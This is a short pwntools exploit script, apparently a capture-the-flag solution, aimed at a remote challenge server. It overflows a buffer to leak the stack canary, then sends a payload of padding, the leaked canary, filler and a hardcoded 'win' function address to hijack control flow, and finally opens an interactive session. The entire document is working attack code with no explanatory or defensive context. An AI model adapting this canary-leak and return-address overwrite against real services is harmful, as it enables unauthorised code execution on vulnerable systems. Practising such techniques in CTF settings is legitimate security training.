from pwn import *
context.arch = "amd64"

bn = remote("beta.hackac.live", 8005)
#gdb.attach(bn)
#input("Waiting for GDB to start in a new window...\nEnter a newline when it has started")

log.info(bn.clean())
bn.sendline(b'A' * 24)   
log.info(bn.recvline())
canary = b'\x00' + bn.recvline()[:-1] 
print("canary", canary)
bn.clean()
win = p64(0x004007a9) 
print("lw", len(win))
payload = b'A' * 24 + canary + b"aaaaaaa" + win

bn.sendline(payload)
bn.interactive()
